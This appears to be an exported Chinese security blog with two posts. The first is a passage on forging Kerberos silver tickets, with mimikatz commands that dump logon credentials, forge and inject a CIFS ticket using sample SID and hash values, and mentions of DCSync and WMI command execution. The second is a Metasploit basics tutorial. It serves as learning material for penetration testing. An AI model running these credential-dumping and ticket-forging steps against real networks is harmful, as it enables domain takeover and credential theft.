<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote<span class="built_in"> Server </span>   RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure>

<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>  首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span> "<span class="selector-tag">privilege</span><span class="selector-pseudo">::debug"</span> "<span class="selector-tag">sekurlsa</span><span class="selector-pseudo">::logonpasswords"</span> "<span class="selector-tag">exit</span>" &gt; 1<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566649973247.png" alt></p>
<h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p>
<p>参数说明：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/domain</span>：当前域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，和金票一样取前面一部分</span><br><span class="line"><span class="string">/target</span>：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line"><span class="string">/service</span>：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line"><span class="string">/rc4</span>：目标主机的HASH值</span><br><span class="line"><span class="string">/user</span>：伪造的用户名</span><br><span class="line"><span class="string">/ptt</span>：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用<span class="string">/ticket</span>导出之后再使用kerberos:<span class="function">:ptt</span>来导入</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /target:OWA2010SP3<span class="number">.0</span>day.org /service:cifs /rc4:<span class="number">125445</span>ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654188946.png" alt></p>
<p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p>
<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654225879.png" alt></p>
<p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p>
<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654265383.png" alt></p>
<h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><table>
<thead>
<tr>
<th>Service Type</th>
<th>Service Silver Tickets</th>
</tr>
</thead>
<tbody><tr>
<td>WMI</td>
<td>HOST RPCSS</td>
</tr>
<tr>
<td>PowerShell Remoting</td>
<td>HOST HTTP</td>
</tr>
<tr>
<td>WinRM</td>
<td>HOST HTTP</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
</tr>
<tr>
<td>Windows File Share (CIFS)</td>
<td>CIFS</td>
</tr>
<tr>
<td>LDAP operations includingMimikatz DCSync</td>
<td>LDAP</td>
</tr>
<tr>
<td>Windows Remote Server Administration Tools</td>
<td>RPCSS LDAP CIFS</td>
</tr>
</tbody></table>
<h5 id="Windows共享（CIFS）管理访问的银票"><a href="#Windows共享（CIFS）管理访问的银票" class="headerlink" title="Windows共享（CIFS）管理访问的银票"></a>Windows共享（CIFS）管理访问的银票</h5><p>为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。</p>
<p>注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括</p>
<p>c $共享，我们能够将文件拷贝到共享文件中。</p>
<h5 id="具有管理员权限的Windows计算机（HOST）白银票据"><a href="#具有管理员权限的Windows计算机（HOST）白银票据" class="headerlink" title="具有管理员权限的Windows计算机（HOST）白银票据"></a>具有管理员权限的Windows计算机（HOST）白银票据</h5><p>创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。</p>
<h5 id="Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"><a href="#Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行" class="headerlink" title="Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"></a>Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</h5><p>为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。</p>
<p>注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</p>
<h5 id="白银票据证连接到具有管理员权限Windows计算机上的LDAP"><a href="#白银票据证连接到具有管理员权限Windows计算机上的LDAP" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的LDAP"></a>白银票据证连接到具有管理员权限Windows计算机上的LDAP</h5><p>为“ldap”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。</p>
<p>利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息</p>
<p><strong>注：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync</span><br></pre></td></tr></table></figure>

<p>​    向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</p>
<h5 id="白银票据证连接到具有管理员权限Windows计算机上的WMI"><a href="#白银票据证连接到具有管理员权限Windows计算机上的WMI" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的WMI"></a>白银票据证连接到具有管理员权限Windows计算机上的WMI</h5><p> 为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。</p>
<p>注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> win32_process <span class="literal">-ComputerName</span> <span class="variable">$</span> Computer <span class="literal">-Credential</span> <span class="variable">$</span> Creds <span class="literal">-name</span> create <span class="literal">-argumentlist</span>“<span class="variable">$</span> RunCommand”</span><br></pre></td></tr></table></figure>

<h5 id="访问域控上“cifs”服务实列"><a href="#访问域控上“cifs”服务实列" class="headerlink" title="访问域控上“cifs”服务实列"></a>访问域控上“cifs”服务实列</h5><p>首先需要获得如下信息：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">domain</span><br><span class="line"><span class="string">/sid</span></span><br><span class="line"><span class="string">/target</span>:目标服务器的域名全称，此处为域控的全称</span><br><span class="line"><span class="string">/service</span>：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line"><span class="string">/rc4</span>：计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line"><span class="string">/user</span>：要伪造的用户名，此处可用silver测试</span><br></pre></td></tr></table></figure>

<p>使用mimikatz执行如下命令导入Silver Ticket</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test.local /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span> /target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"</span><br></pre></td></tr></table></figure>

<p>此时可以成功访问域控上的文件共享</p>
<h4 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h4><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul>
<li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li>
<li>Silver Ticket: 伪造TGS,只能访问指定的服务</li>
</ul>
<p><strong>2.加密方式不同</strong></p>
<ul>
<li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li>
<li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li>
</ul>
<h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul>
<li>Golden Ticket 的利用过程需要访问域控(KDC)</li>
<li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li>
</ul>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>[<a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]</a>(<a href="https://wooyun.js.org/drops/域渗透——Pass" target="_blank" rel="noopener">https://wooyun.js.org/drops/域渗透——Pass</a> The Ticket.html)</p>
<p><a href="http://www.test666.me/archives/264/" target="_blank" rel="noopener">http://www.test666.me/archives/264/</a></p>
<p><a href="https://uknowsec.cn/posts/notes/域渗透-Ticket.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html</a></p>
<p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p>
<p><a href="http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" target="_blank" rel="noopener">http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/</a></p>
<h5 id><a href="#" class="headerlink" title></a></h5>]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
      <tags>
        <tag>票据</tag>
      </tags>
  </entry>
  <entry>
    <title>Mestasploit基本使用学习</title>
    <url>/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/</url>
    <content><![CDATA[<h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul>
<li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li>
<li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li>
<li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li>
</ul>
<h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul>
<li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p>
</li>
<li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p>
</li>
<li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p>
<ul>
<li>框架继承了渗透测试标准（PETS）标准</li>
<li>一定程度上统一了渗透测试研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li><p>开发活跃版本更新频繁</p>
<ul>
<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
<li>目前分化为四个版本，社区版依然十分活跃</li>
<li>HD More说：为 Metasploit 写书是种自虐</li>
</ul>
</li>
<li><p>Metasploit 默认集成 kali linux 中</p>
</li>
<li><p>使用 postgresql 数据库存储数据</p>
<ul>
<li>早期版本需要先启动数据库再启动 msf</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/zXzemZd.png" alt="img"></p>
</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/mgJH3KP.jpg" alt="img"></p>
<h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
<li>Rex<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li>
<li>编码转换（XOR、Base64、Unicode）</li>
</ul>
</li>
<li>Msf::Core<ul>
<li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li>
</ul>
</li>
<li>Msf::Base<ul>
<li>提供友好的的 API 接口，便于模块调用的库</li>
</ul>
</li>
<li>Plugin 插件<ul>
<li>连接和调用外部扩展功能和系统</li>
</ul>
</li>
<li>模块<ul>
<li>/usr/share/metasploit-framework/modules/</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
</ul>
</li>
<li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul>
<li>shellcode 或系统命令</li>
<li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li>
<li>Single：all-in-one</li>
<li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li>
<li>stages：利用 stager 建立的连接下载的后续payload</li>
<li>stager、stages 都有多种类型，适用于不同场景</li>
<li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
<li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li>
<li>Nops：提高 paylaod 稳定性及维持大小</li>
</ul>
</li>
</ul>
<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul>
<li>使用前先升级：<strong>msfupdate</strong></li>
<li>msfcli 使用接口，现在已经更新至 msfconsole -x</li>
<li>msfconsole 使用接口<ul>
<li>最流行的用户接口</li>
<li>几乎可以使用全部 msf 功能</li>
<li>控制台命令支持 TAB 自动补全</li>
<li>支持外部命令的执行（系统命令等）</li>
</ul>
</li>
<li>点击鼠标启动</li>
</ul>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">通用选项:</span><br><span class="line">    -<span class="ruby">E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或<span class="string">'生产'</span></span></span><br><span class="line"></span><br><span class="line"><span class="ruby">数据库选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录</span></span><br><span class="line"><span class="ruby">    -n, --no-database                禁用数据库支持</span></span><br><span class="line"><span class="ruby">    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">框架选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -c FILE                          加载指定的配置文件</span></span><br><span class="line"><span class="ruby">    -v, -V, --version                显示版本</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">模块选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">        --defer-<span class="class"><span class="keyword">module</span>-<span class="title">loads</span>         除非明确询问，否则推迟模块加载</span></span></span><br><span class="line"><span class="ruby">    -m, --<span class="class"><span class="keyword">module</span>-<span class="title">path</span> <span class="title">DIRECTORY</span>      加载一个额外的模块路径</span></span></span><br><span class="line"></span><br><span class="line"><span class="ruby">控制台选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -a, --ask                        在退出Metasploit之前询问或接受<span class="string">'退出-y'</span></span></span><br><span class="line"><span class="ruby">    -H, --history-file FILE          将命令历史记录保存到指定的文件</span></span><br><span class="line"><span class="ruby">    -L, --real-readline              使用系统Readline库而不是RbReadline</span></span><br><span class="line"><span class="ruby">    -o, --output FILE                输出到指定的文件</span></span><br><span class="line"><span class="ruby">    -p, --plugin PLUGIN              在启动时加载插件</span></span><br><span class="line"><span class="ruby">    -q, --quiet                      不要在启动时显示 banner 信息</span></span><br><span class="line"><span class="ruby">    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）</span></span><br><span class="line"><span class="ruby">    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）</span></span><br><span class="line"><span class="ruby">    -h, --help                       显示此消息</span></span><br></pre></td></tr></table></figure>

<ul>
<li>进入 msfconsole，查看帮助信息</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf &gt; help</span><br><span class="line"></span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    ?             帮助菜单</span></span><br><span class="line"><span class="code">    banner        显示一个很棒的metasploit横幅</span></span><br><span class="line"><span class="code">    cd            更改当前的工作目录</span></span><br><span class="line"><span class="code">    color         切换高亮显示颜色</span></span><br><span class="line"><span class="code">    connect       连接与主机通信</span></span><br><span class="line"><span class="code">    exit          退出退出控制台</span></span><br><span class="line"><span class="code">    get           获取特定于上下文的变量的值</span></span><br><span class="line"><span class="code">    getg          获取全局变量的值</span></span><br><span class="line"><span class="code">    grep          Grep另一个命令的输出</span></span><br><span class="line"><span class="code">    help          帮助菜单</span></span><br><span class="line"><span class="code">    history       历史显示命令历史</span></span><br><span class="line"><span class="code">    irb           进入irb脚本模式</span></span><br><span class="line"><span class="code">    load          加载一个框架插件</span></span><br><span class="line"><span class="code">    quit          退出控制台</span></span><br><span class="line"><span class="code">    route         路由通过会话路由流量</span></span><br><span class="line"><span class="code">    save          保存保存活动的数据存储</span></span><br><span class="line"><span class="code">    sessions      会话转储会话列表并显示有关会话的信息</span></span><br><span class="line"><span class="code">    set           将特定于上下文的变量设置为一个值</span></span><br><span class="line"><span class="code">    setg          将全局变量设置为一个值</span></span><br><span class="line"><span class="code">    sleep         睡眠在指定的秒数内不执行任何操作</span></span><br><span class="line"><span class="code">    spool         将控制台输出写入文件以及屏幕</span></span><br><span class="line"><span class="code">    threads       线程查看和操作后台线程</span></span><br><span class="line"><span class="code">    unload        卸载卸载框架插件</span></span><br><span class="line"><span class="code">    unset         取消设置取消设置一个或多个特定于上下文的变量</span></span><br><span class="line"><span class="code">    unsetg        取消设置取消设置一个或多个全局变量</span></span><br><span class="line"><span class="code">    version       版本显示框架和控制台库版本号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模块命令</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    advanced      高级显示一个或多个模块的高级选项</span></span><br><span class="line"><span class="code">    back          返回从当前上下文返回</span></span><br><span class="line"><span class="code">    edit          编辑使用首选编辑器编辑当前模块或文件</span></span><br><span class="line"><span class="code">    info          显示有关一个或多个模块的信息</span></span><br><span class="line"><span class="code">    loadpath      加载路径搜索并加载路径中的模块</span></span><br><span class="line"><span class="code">    options       选项显示全局选项或一个或多个模块</span></span><br><span class="line"><span class="code">    popm          将最新的模块从堆栈弹出并使其处于活动状态</span></span><br><span class="line"><span class="code">    previous      将之前加载的模块设置为当前模块</span></span><br><span class="line"><span class="code">    pushm         将活动或模块列表推入模块堆栈</span></span><br><span class="line"><span class="code">    reload_all    重新加载所有定义的模块路径中的所有模块</span></span><br><span class="line"><span class="code">    reload_lib    从指定路径加载库文件</span></span><br><span class="line"><span class="code">    search        搜索搜索模块名称和说明</span></span><br><span class="line"><span class="code">    show          显示给定类型的模块或所有模块</span></span><br><span class="line"><span class="code">    use           使用按名称选择模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">工作命令</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    handler       处理程序作为作业启动负载处理程序</span></span><br><span class="line"><span class="code">    jobs          作业显示和管理作业</span></span><br><span class="line"><span class="code">    kill          杀死一份工作</span></span><br><span class="line"><span class="code">    rename_job    重命名作业</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">资源脚本命令</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    makerc        保存从开始到文件输入的命令</span></span><br><span class="line"><span class="code">    resource      运行存储在文件中的命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据库后端命令</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令                描述</span></span><br><span class="line"><span class="code">    -------           -----------</span></span><br><span class="line"><span class="code">    db_connect        连接到现有的数据库</span></span><br><span class="line"><span class="code">    db_disconnect     断开当前数据库实例</span></span><br><span class="line"><span class="code">    db_export         导出包含数据库内容的文件</span></span><br><span class="line"><span class="code">    db_import         导入扫描结果文件（文件类型将被自动检测）</span></span><br><span class="line"><span class="code">    db_nmap           执行nmap并自动记录输出</span></span><br><span class="line"><span class="code">    db_rebuild_cache  重建数据库存储的模块缓存</span></span><br><span class="line"><span class="code">    db_status         显示当前的数据库状态</span></span><br><span class="line"><span class="code">    hosts             列出数据库中的所有主机</span></span><br><span class="line"><span class="code">    loot              列出数据库中的所有战利品</span></span><br><span class="line"><span class="code">    notes             列出数据库中的所有注释</span></span><br><span class="line"><span class="code">    services          列出数据库中的所有服务</span></span><br><span class="line"><span class="code">    vulns             列出数据库中的所有漏洞</span></span><br><span class="line"><span class="code">    workspace         在数据库工作区之间切换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">凭证后端命令</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    creds         列出数据库中的所有凭据(密码)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>msf &gt; help show</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[*]“<span class="keyword">show</span>” 命令的有效参数是：<span class="keyword">all</span>, encoders, nops, exploits, payloads, auxiliary, plugins, <span class="keyword">info</span>, <span class="keyword">options</span></span><br><span class="line">[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</span><br></pre></td></tr></table></figure>

<ul>
<li>msf &gt; help search</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">用法</span>: <span class="string">search [keywords]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Keywords</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">app</span>       :  <span class="string">客户端或服务器攻击的模块</span></span><br><span class="line">  <span class="attr">author</span>    :  <span class="string">本作者编写的模块</span></span><br><span class="line">  <span class="attr">bid</span>       :  <span class="string">具有匹配的Bugtraq ID的模块</span></span><br><span class="line">  <span class="attr">cve</span>       :  <span class="string">具有匹配CVE ID的模块</span></span><br><span class="line">  <span class="attr">edb</span>       :  <span class="string">具有匹配的Exploit-DB ID的模块</span></span><br><span class="line">  <span class="attr">name</span>      :  <span class="string">具有匹配描述性名称的模块</span></span><br><span class="line">  <span class="attr">platform</span>  :  <span class="string">影响这个平台的模块</span></span><br><span class="line">  <span class="attr">ref</span>       :  <span class="string">具有匹配参考的模块</span></span><br><span class="line">  <span class="attr">type</span>      :  <span class="string">特定类型的模块（exploit，auxiliary或post）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf</span> <span class="string">&gt; search ms08-067</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">&gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</span></span><br></pre></td></tr></table></figure>

<ul>
<li>模块内命令</li>
</ul>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">msf &gt; search ms09_001_write</span><br><span class="line">msf &gt; use auxiliary<span class="regexp">/dos/</span>windows<span class="regexp">/smb/</span>ms09_001_write</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; info</span><br><span class="line"></span><br><span class="line">[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show missing</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show advanced</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; help edit</span><br><span class="line">    用法：编辑[file <span class="regexp">/ to /</span> edit.rb]</span><br><span class="line">    使用编辑当前活动模块或本地文件。</span><br><span class="line">    如果指定了文件路径，它将在编辑后自动重新加载。</span><br><span class="line">    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; edit</span><br></pre></td></tr></table></figure>

<ul>
<li>数据库操作</li>
</ul>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">msf &gt; <span class="keyword">help</span> db_<span class="keyword">connect</span> </span><br><span class="line">    [*]    Usage: db_<span class="keyword">connect</span> &lt;user<span class="function">:pass</span>&gt;@&lt;host<span class="function">:port</span>&gt;/&lt;database&gt;</span><br><span class="line">    [*]       OR: db_<span class="keyword">connect</span> -y [path/to/database.yml]</span><br><span class="line">    [*] Examples:</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user@metasploit3</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user<span class="function">:pass</span>@192.168.0.2/metasploit3</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user<span class="function">:pass</span>@192.168.0.2<span class="function">:1500</span>/metasploit3</span><br><span class="line"></span><br><span class="line">msf &gt; <span class="keyword">help</span> db_import</span><br><span class="line">    Usage: db_import &lt;filename&gt; [file2.<span class="string">..</span>]</span><br><span class="line">    Filenames can be globs like *<span class="string">.xml</span>, or **/*<span class="string">.xml</span> which will search recursively</span><br><span class="line"></span><br><span class="line">msf &gt; <span class="keyword">help</span> db_export</span><br><span class="line">    Usage:</span><br><span class="line">    db_export -f &lt;format&gt; [filename]</span><br><span class="line">    Format can be one of: xml, pwdump</span><br></pre></td></tr></table></figure>

<ul>
<li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li>
</ul>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">活动的会话操作和交互。</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line"></span><br><span class="line">    -<span class="ruby">C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令</span></span><br><span class="line"><span class="ruby">    -K        终止所有会话</span></span><br><span class="line"><span class="ruby">    -S &lt;opt&gt;  行搜索过滤器。</span></span><br><span class="line"><span class="ruby">    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令</span></span><br><span class="line"><span class="ruby">    -h        帮助横幅</span></span><br><span class="line"><span class="ruby">    -i &lt;opt&gt;  与提供的会话ID进行交互</span></span><br><span class="line"><span class="ruby">    -k &lt;opt&gt;  按会话ID和/或范围终止会话</span></span><br><span class="line"><span class="ruby">    -l        列出所有活动会话</span></span><br><span class="line"><span class="ruby">    -n &lt;opt&gt;  按ID命名或重命名会话</span></span><br><span class="line"><span class="ruby">    -q        静音模式</span></span><br><span class="line"><span class="ruby">    -r        重置用-i或全部给定的会话的环形缓冲区</span></span><br><span class="line"><span class="ruby">    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块</span></span><br><span class="line"><span class="ruby">    -t &lt;opt&gt;  设置响应超时（默认值：<span class="number">15</span>）</span></span><br><span class="line"><span class="ruby">    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话</span></span><br><span class="line"><span class="ruby">    -v        以详细模式列出会话</span></span><br><span class="line"><span class="ruby">    -x        在会话表中显示扩展信息</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">许多选项允许使用逗号和破折号指定会话范围。</span></span><br><span class="line"><span class="ruby">例如:  sessions -s checkvm -i <span class="number">1</span>,<span class="number">3</span>-<span class="number">5</span>  <span class="keyword">or</span>  sessions -k <span class="number">1</span>-<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span></span></span><br></pre></td></tr></table></figure>

